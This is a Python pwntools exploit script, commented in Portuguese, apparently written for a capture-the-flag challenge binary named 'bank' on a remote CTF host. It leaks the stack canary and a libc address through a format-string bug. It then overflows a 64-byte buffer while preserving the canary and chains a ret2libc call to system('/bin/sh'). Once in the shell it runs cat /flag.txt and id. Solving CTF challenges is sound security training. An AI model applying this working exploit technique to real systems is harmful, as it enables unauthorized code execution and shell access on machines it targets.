#!/usr/bin/env python3
from pwn import *
import re
import sys
import time

# ============================================================
# Canary Wharf exploit corrigido
#
# Vulnerabilidades:
# 1. check_balance(): printf(note)
#    Permite format string e leak de stack/libc/canary.
#
# 2. transfer_funds(): read(0, amount, 256)
#    amount tem só 64 bytes, então temos overflow.
#
# Estratégia:
# - Vazar canary e libc em UMA única chamada de check_balance().
# - Calcular base da libc.
# - Preservar canary no overflow.
# - Fazer ret2libc para system("/bin/sh").
# - Executar cat /flag.txt.
# ============================================================

context.binary = "./bank"
context.log_level = "info"

BIN = "./bank"
LD = "./ld-linux-x86-64.so.2"
LIBC_PATH = "./libc.so.6"
LIBC_DIR = "."

HOST = "7dc0a9a999cc700b.chal.ctf.ae"
PORT = 443

elf = ELF(BIN)
libc = ELF(LIBC_PATH)

# Confirmados localmente:
# %25$p = stack canary
# %3$p  = libc.so.6 + 0x114907
CANARY_INDEX = 25
LIBC_LEAK_INDEX = 3
LIBC_LEAK_OFFSET = 0x114907

# Layout provável:
# amount[64] + padding[8] + canary[8] + saved_rbp[8] + RIP
OFFSET_TO_CANARY = 72

def start():
    """
    Modo remoto por padrão.
    Para testar local:
    python3 script6.py local
    """
    if len(sys.argv) > 1 and sys.argv[1] == "local":
        return process([LD, "--library-path", LIBC_DIR, BIN])

    return remote(HOST, PORT, ssl=True, sni=HOST)

def leak_canary_and_libc(p):
    """
    Faz um único leak com:
    %25$p|%3$p

    Isso evita o bug anterior em que o script consumia o prompt
    e depois ficava esperando outro prompt que não existia.
    """
    p.recvuntil(b"> ")
    p.sendline(b"1")

    p.recvuntil(b"Enter account memo: ")

    payload = f"%{CANARY_INDEX}$p|%{LIBC_LEAK_INDEX}$p".encode()
    log.info(f"format payload = {payload!r}")
    p.sendline(payload)

    data = p.recvuntil(b"> ", timeout=5)

    print()
    print("=" * 90)
    print("RESPOSTA DO LEAK")
    print("=" * 90)
    print(data.decode(errors="replace"))

    match = re.search(rb"Account Holder: (0x[0-9a-fA-F]+)\|(0x[0-9a-fA-F]+)", data)
    if not match:
        raise RuntimeError("Não consegui parsear canary/libc leak.")

    canary = int(match.group(1), 16)
    libc_leak = int(match.group(2), 16)

    return canary, libc_leak

def build_payload(canary, libc_base):
    """
    Monta payload ret2libc.
    """
    libc.address = libc_base

    rop = ROP(libc)

    ret = rop.find_gadget(["ret"]).address
    pop_rdi = rop.find_gadget(["pop rdi", "ret"]).address
    bin_sh = next(libc.search(b"/bin/sh\x00"))
    system = libc.sym["system"]

    log.info(f"canary    = {canary:#x}")
    log.info(f"libc leak = {libc_base + LIBC_LEAK_OFFSET:#x}")
    log.info(f"libc base = {libc_base:#x}")
    log.info(f"ret       = {ret:#x}")
    log.info(f"pop rdi   = {pop_rdi:#x}")
    log.info(f"/bin/sh   = {bin_sh:#x}")
    log.info(f"system    = {system:#x}")

    payload = b"A" * OFFSET_TO_CANARY
    payload += p64(canary)
    payload += b"B" * 8
    payload += p64(ret)
    payload += p64(pop_rdi)
    payload += p64(bin_sh)
    payload += p64(system)

    return payload

def exploit():
    p = start()

    canary, libc_leak = leak_canary_and_libc(p)
    libc_base = libc_leak - LIBC_LEAK_OFFSET

    print()
    print("=" * 90)
    print("VALORES CALCULADOS")
    print("=" * 90)
    print(f"canary:    {canary:#x}")
    print(f"libc leak: {libc_leak:#x}")
    print(f"libc base: {libc_base:#x}")

    payload = build_payload(canary, libc_base)

    print()
    print("=" * 90)
    print("ENVIANDO OVERFLOW")
    print("=" * 90)

    # O prompt > já foi consumido pelo recvuntil anterior.
    # O programa está parado aguardando opção do menu.
    p.sendline(b"2")
    p.recvuntil(b"Enter transfer details: ")
    p.sendline(payload)

    time.sleep(0.4)

    # Se system('/bin/sh') funcionou, esses comandos serão executados no shell.
    p.sendline(b"cat /flag.txt")
    p.sendline(b"id")
    p.sendline(b"exit")

    output = p.recvall(timeout=5)

    print()
    print("=" * 90)
    print("OUTPUT FINAL")
    print("=" * 90)
    print(output.decode(errors="replace"))

    match = re.search(rb"flag\{[^}\r\n]+\}", output, re.IGNORECASE)
    if match:
        flag = match.group(0).decode()
        print()
        print("=" * 90)
        print("[+] FLAG ENCONTRADA")
        print("=" * 90)
        print(flag)

        with open("flag.txt", "w", encoding="utf-8") as f:
            f.write(flag + "\n")

        print("[+] Flag salva em flag.txt")
    else:
        print()
        print("[-] Flag não apareceu.")
        print("[*] Se não houve 'stack smashing detected', o próximo ajuste é testar local com:")
        print("    python3 script6.py local")

if __name__ == "__main__":
    exploit()
